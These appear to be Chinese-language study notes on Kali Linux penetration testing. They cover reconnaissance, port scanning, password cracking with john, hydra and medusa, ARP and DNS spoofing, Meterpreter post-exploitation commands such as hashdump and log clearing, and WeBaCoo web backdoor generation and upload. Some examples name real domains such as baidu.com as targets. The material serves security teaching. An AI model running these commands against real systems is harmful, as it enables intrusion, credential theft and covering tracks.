第一章：Kali入门

虚拟机设置固定ip地址

需要修改虚拟机的网络设置文件/etc/network/interfaces
并设置ip和子网掩码等。

配置无线网络

kali可以使用USB接口的无线网卡。
如果无线网卡可以被kali识别，可以用dmesg指令的输出中看到无线网卡的硬件信息。

启用网络

可以通过service指令来启动和关闭网络
开启网络：
service networking start
关闭网络：
service networking stop
开机自动启动：
update-rc.d networking defaults

系统更新

apt-get指令会查询/etc/apt/sources.list文件，从中获取更新服务器的信息。
同步索引的指令：
apt-get update
系统更新的指令：
apt-get upgrade：升级系统上安装的所有软件包
apt-get dist-upgrade：升级整个Kali Linux系统

apache2

渗透的时候，可能经常会用到Web服务器
开启apache服务器的指令：
service apache2 start
关闭apache服务器的指令：
service apache2 stop
开机自动启动：
update-rc.d apache2 defaults

MySQL

通常会把渗透测试的测试结果存储到MySQL服务器里。
启动MySQL指令：
service mysql start
登录MySQL服务器：
mysql -u root -p
停止MySQL指令：
service mysql stop

SSH

全称Secure Shell，可以用于远程登录会话和其他网络服务提供安全性的协议。
开启kali的ssh服务，使之可以在远程被登录：
service ssh start
关闭ssh服务：
service ssh stop
开机自动启动：
update-rc.d ssh defaults

第二章：渗透测试方法论

渗透测试种类

分为两类：白盒测试和黑盒测试

黑盒测试：安全审计员在不清楚被测单位的内部技术构造的情况下，从外部评估网络基础设施的安全性。
白盒测试：白盒测试的审计员可以获取被测单位的各种内部资料甚至不公开资料，所以渗透测试人员的视野更为开阔。

通用渗透测试框架

步骤包括：

  • 范围界定
  • 信息收集
  • 目标识别
  • 服务枚举
  • 漏洞映射
  • 社会工程学
  • 漏洞利用
  • 提升权限
  • 访问维护
  • 文档报告

第四章：信息收集

whois

WHOIS是一个标准的互联网协议，可以用于收集：

  • DNS服务器信息
  • 域名注册人的联系信息

使用：
whois baidu.com

DNS记录分析

DNS记录可以记下述几类：

  • NS：名称解析服务器
  • A：IPv4地址
  • PTR：逆向解析记录
  • AAAA：IPv6地址

host

DNS服务器有主机的IP地址，我们可以使用host指令向DNS服务器查询主机的IP地址，可以收集：

  • IP地址

使用：
host baidu.com
指定DNS服务器：
host -l baidu.com ns4.isp.com
指定查询某个记录（如A记录）：
host -a baidu.com

dig

dig指令与host指令类似，也可以用于DNS查询，相比host指令而言，更加灵活，可以收集：

  • DNS的各种记录

使用（默认只查A记录）：
dig baidu.com
查询全部类型的DNS数据：
dig baidu.com any

dnsenum

dnsenum也可以收集DNS数据，相比前两个功能更加多，可以收集：

  • DNS的各种记录，并作分类
  • 其他功能：
    • 谷歌搜索子域名
    • 子域名爆破
    • C段whois查询
    • 网段反向查询

使用：
dnsenum baidu.com
子域名爆破：
dnsenum -f dns.txt baidu.com

DMitry

这是一个多功能的信息搜集工具，主要收集：

  • whois
  • Netcrafg.coms收集信息（没听过）
  • 子域名
  • 邮件地址
  • 端口

使用（除了端口外收集）：
dmitry -iwnse baidu.com
端口扫描（从1~n扫的）：
dmitry -p baidu.com -f -b

Maltego

图形化的多功能的信息收集工具，这个工具可以标注各种信息之间的关联，可以收集：

  • whois
  • IP
  • 域名

还能收集人的信息：

  • 某人的公司或组织
  • 某人的邮件地址
  • 某人有关的网站
  • 某人有关的社交网站
  • 某人有关的电话号码

使用：
图形界面，点来点去就行了。

路由信息

网络路由信息可以帮助测试人员了解自己的主机到目标主机之间的网络通信路径，进而理解目标主机的网络情况。

tcptraceroute

tcptraceroute是traceroute的补充工具，传统的traceroute是在发送的UDP或ICMP echo数据包里，设置TTL标志位，将TTL从1递增，指到数据包到达目标主机为止。而tcptracroute是使用TCP SYN数据包进行测试。
特点就是，如果对方防火墙禁止了traceroute指令，那么对tcptracroute是一点效果都没有的。
如果目标端口是开放，接收到SYN数据包，会立即返回RST数据包。

使用：
tcptraceroute www.baidu.com

tctrace

和tcptraceroute类似，也是通过发送TCP SYN数据包来获取相应信息。

使用：
tctrace -i eth0 -d www.baidu.com

搜索引擎

搜索引擎也有很多信息哦。

theharvester

就是个搜索引擎集成工具，可以收集：

  • 邮件地址
  • 用户名
  • 主机名
  • 子域名

使用：
从谷歌的前100项结果挖掘baidu的电子邮件地址和主机名
theharvester -d baidu.com -l 100 -b google

Metagoofil

这个工具通过谷歌搜索引擎搜索目标域的各种文件，可以收集的文件：

  • Word
  • 表格文件EXCEL
  • 演示文件PPT
  • PDF文件

使用：
-d：目标域(baidu.com)
-t：文件类型(doc、pdf)
-l：收集多少个(20个)
-n：下载几个(5个)
-f：保存的文件名(test.html)
-o：保存在某个目录下(test目录下)
metagoofil -d baidu.com -l 20 -t doc,pdf -n 5 -f test.html -o test

第五章：目标识别

识别目标主机

5个ping命令

ping

检查主机是否在线的工具。
该工具向目标发送ICMP的echo request数据包，如果目标主机在线且允许受理ping请求，那么目标主机将回复ICMP echo reply数据包。

使用：
-c：设置发送数echo request数据包的数量
ping -c 1 192.168.15.1

arping

arping是在局域网中使用ARP请求判断目标主机是否在线的工具。可以使用IP地址或者MAC地址作为它的测试目标。它只能检测本地局域网络中的主机。

使用：
arping 192.168.15.1 -c 1

fping

与ping相比，多了可以同时向多个主机发送ping请求的功能。

使用：
fping 192.168.15.1 192.168.15.2
ping一个网段：
fping -g 192.168.15.0/24
-r设置重复次数，默认为3，类似-c：
fping -r 1 192.168.15.2 192.168.15.3

hping3

可以使用这个工具生成自定义的网络数据包进行测试，比如：ip、icmp、udp、tcp等
具体参数看书P112。

使用：
比如ICMP
hping3 -I 192.168.15.2 -c 1

nping

更加高度的自定义设置网络数据包，可以修改协议头的字段，如修改TCP和UDP的源端口和目的端口，还可以指定多个目标。

具体参数看书P116。

使用：
比如tcp(-p 指定端口)
nping --tcp -c 1 -p 22 192.168.15.1

识别操作系统

确定目标主机在线，应当识别它们使用的操作系统。

p0f

p0f采用被动方式的方法探测目标主机的操作系统类型。

使用：
因为是被动的，所以不需要指定目标主机
-f：指定指纹数据库文件
-o：保存为日志文件
p0f -f /etc/p0f/p0f.fp -o p0f.log

Nmap

记住-O是识别操作系统就行了。

使用：
nmap -O 192.168.15.1

第六章：服务枚举

TCP/IP协议

UDP
基于UDP协议的：DNS、DHCP、SNMP
特点：

  • 面向无连接
  • 尽可能将数据包发送到目标地址，不会自动重传

TCP
三次握手：syn、syn ack、ack
特点：

  • 面向连接
  • 可靠

常用端口：

  • 80：HTTP
  • 443：HTTPS
  • 23：Telnet
  • 21：FTP
  • 22：SSH
  • 25：SMTP
  • 8080：TOMCAT
  • 3389：WIN2003远程登录
  • 8081：Symantec AV/Filter for MSE
  • 1521：Oracle
  • 1433：MSSQL、SQL SERVER
  • 3306：Mysql
  • 1080：QQ/udp
  • 53：DNS/udp

Nmap

-sT：TCP连接扫描，三次握手
-sS：SYN扫描，默认，半开
-sN：TCP NULL，不设置控制位
-sF：FIN扫描，仅设置FIN标志位
-sX：XMAS扫描，设置\FIN\PSH\URG标志位
-sM：TCP Maimon扫描
-sA：TCP ACK扫描
-sW：TCP窗口扫描
-sI：TCP Idle扫描
-sU：UDP扫描，速度慢
-sV：检测服务端软件的版本信息
-O：识别目标主机的操作系统
-Pn：在目标主机禁止ping的时候用
-A：强力检测，Nmap将检测下述信息-sV、-O、-sC、–traceroute，时间较长
-sC或者- -script=default：启动默认类NSE脚本
- -script filename：指定文件名执行相应的脚本

Unicornscan

信息收集和关联分析的引擎，与其他类似工具区别在于扩展性和高效性，在扫描UDP端口方面速度比较快。

使用：
检测UDP协议，速度10000
unicornscan -m U -Iv 192.168.15.1:1-65535 -r 10000

Zenmap

nmap的图形化工具。交互性更好，可以比较两次扫描结果，可以调整配置文件

使用：
图形的点点就好了。

Amap

可检测在指定端口上运行的服务程序。在快速识别服务程序方面表现良好。

使用：
-b：获取banner信息
-q：禁止程序报告关闭的端口（看不懂）
-v：防止报错
扫描22端口上运行的程序
amap -bqv 192.168.15.2 22

SMB枚举

如果测试的目标主机是Windows，可以使用nbtscan工具来获取系统的信息。
这个工具可以获取：

  • IP
  • NetBIOS计算机名
  • 服务名称
  • 已登录用户名
  • MAC地址

使用：
nbtscan 192.168.15.1-254

SNMP枚举

可以从配置不当的SNMP设备上获取配置文件，挖掘重要信息。
知道3个命令就行了：
onesixtyone：
onesixtyone 192.168.15.1
onesixtyone细致扫：
onesixtyone -d 192.168.15.1
snmpcheck：
snmpcheck -t 192.168.15.1

VPN枚举

知道用ike-scan可以用来VPN枚举应该就行了。

Metepreter

Metepreter是一种先进的、隐蔽的、多功能的、可动态扩展的payload，它可在目标主机的系统内存注入DLL。还支持运行期间加载脚本和插件。方便提权等。
Metepreter shell会采用全程加密通信。

  • background：隐藏到后台
  • sessions：
    • -l：查看以成功获取的回话
    • -i 1：切换到第一个回话
  • quit：关闭当前回话
  • shell：获取系统控制台shell
  • cat：查看文件内容
  • getwd：获取当前目录
  • upload：上传文件
  • download：下载文件
  • edit：vi编辑器
  • ipconfig：网络信息
  • portfwd：端口转发
  • portfwd add -l 1234 -p 3389 -r 192.168.15.1
  • route：路由信息
  • migrate：进程迁移
  • getpid：获取当前会话pid
  • kill：杀死进程
  • getuid：获取当前会话的权限
  • sysinfo：获取目标系统信息
  • getsystem：提权
  • hashdump：获取系统密码hash
  • clearrev：日志清除
  • timestomp：修改文件访问时间

第十章：提升权限

samdump2

Windows系统账户密码，以哈希值的形式存储于SAM的文件型数据库里。

使用：
整理sam文件，保存为test-sam
samdump2 system sam -o test-sam

获取Windows密码哈希值的方法：直接使用samdump2，在Windows运行期间，不能读取。可挂在到其他系统分区；使用pwdump系列软件；Meterpreter后，使用hashdump命令。

john

破解密码哈希值的工具

使用：
unshadow /etc/passwd /etc/shadow > pass 合并hash文件
john pass：破解哈希
john --show pass：查看密码
john test-sam --wordlist=password.lst -format=nt：使用字典文件破解Windows哈希

CeWL

以爬虫模式在指定URL上收集单词，把收集到的单词纳入密码字典，提高命中率。

用法：
cewl -w target.txt http://www.baidu.com

hydra

猜测并破解用户名和密码的工具，支持多种网络协议，可以破解HTTP、FTP、POP3和SMB等协议的密码。

使用：
破解VNC服务器密码
hydra -P password.lst 192.168.15.1

medusa

在线破解网络服务密码的程序，速度快、并发性能强、模板化、另有通用模板。

使用：
破解VNC服务器密码
medusa -u root -P password.lst -h 192.168.15.1 -M vnc -v 4

网络欺骗工具

指的是修改网络数据的各种手段，旨在获取网络上两个会话主机之间的通信数据。如伪造MAC地址、伪造IP地址等。

DNSChef

DNS代理工具，可替代DNS服务器对被测主机进行DNS回复，把域名解析为攻击者管控的IP，从而获取客户主机的网络流量。

使用：
骗192.168.15.2访问192.168.15.1，并将google.com解析为本机
dnschef --fakeip=192.168.15.2 --fakedomains google.com --interface 192.168.15.1 -q

arpspoof

ARP欺骗工具

使用：
网关为192.168.15.1，被骗主机192.168.15.3,
arpspoof -t 192.168.15.3 192.168.15.1

Ettercap

在LAN中进行中间人攻击的工具集，通过ARP攻击充当网络通信的中间人，还可以做DNS欺骗

使用：
图形化界面，点来点去

第十一章：访问维持

WeBaCoo

隐蔽的脚本类Web后门工具。Web服务器和客户端之间的通信载体是Cookie

使用：
生成后门
webacoo -g -o test.php
上传到被测主机
webacoo -t -u http://www.baidu.com/test.php

内网和域

域管理的好处

  • 1、方便管理，权限管理比较集中
  • 2、安全性高
  • 3、SMS能够分发应用程序、系统补丁等

域渗透常用命令

ipconfig /all：查看本机IP，所在域
ping D1.com ：查看域控的IP
nltest /dclist:d1 ： 查看域控名字
net time /domain ：查看时间，域控机器名
net view：显示域中的计算机名列表
net view /domain:D1：显示指定域中机器名
net user /domain ：查看当前域中的用户
net group “domain admins” /domain：查询域管理员用户组
net config workstation：显示更改可配置工作站参数，也可以获得登录域，机器名等信息
net accounts：查看本地密码策略
netstat –an/ano/anb：网络连接查询
route print：路由表
dsquery：可以用来收集跨域的信息，但是跨域执行的前提是必须建立信任关系

端口转发

ppt上挺多的，见第8章后面部分。

举例：
攻击机不能直接访问内网WEB服务器，需要内网中的XP做端口转发

在攻击机上运行：htran.exe -p -listen 9999 3333。把本机端口9999转发到3333。并监听9999
在内网XP机上运行htran.exe -p -slave 10.10.10.130 9999 192.168.66.133 3389
把WEB服务器的3389端口转到攻击机的9999端口。

powershell

是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework的强大功能。

Powershell的优点:
1.代码运行在内存中可以不去接触磁盘
2.从另一个系统中下载代码并执行
3.很多安全产品并不能监测到powershell的活动
4.cmd.exe通常被阻止运行，但是powershell不会

简单命令：
（1）查看版本信息$PSVersionTable
（2）获取当前目录的所有文件信息： ls或者dir
（3）把命令输出保存到文件中：’>’为覆盖，’>>’追加
（4）支持常用的加减乘除模（+,-,*,/,%）运算
（5）能自动识别计算机容量单位,包括KB、MB、GB、TB、PB
（6）Powershell 能够像CMD一样很好的执行外部命令：
通过netstat查看网络端口状态。
通过ipconfig查看自己的网络配置。
通过route print查看路由信息。
启动CMD控制台键入cmd、退出命令exit。通过Cmd /chelp查找可用的cmd控制台命令。
